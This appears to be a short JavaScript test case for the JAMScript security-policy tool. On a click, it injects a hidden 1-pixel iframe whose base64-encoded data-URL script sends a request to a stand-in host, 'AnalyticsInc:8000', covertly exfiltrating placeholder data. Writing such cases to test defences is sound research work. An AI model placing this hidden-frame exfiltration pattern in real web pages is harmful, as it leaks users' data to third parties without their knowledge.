function exfiltrate_key_history() {
  var data$$18 = "PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNSIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var URL = "data:text/html;charset=utf-8;base64," + data$$18;
  var script = document.createElement("iframe");
  script.src = URL;
  var v0 = script.style;
  v0.width = "1px";
  var v1 = script.style;
  v1.height = "1px";
  var v4 = document.getElementsByTagName("body");
  var v2 = v4[0];
  JAMScript.call(v2.appendChild, v2, [script]);
  return
}
var v3 = document.getElementById("test");
JAMScript.set(v3, "onclick", exfiltrate_key_history);

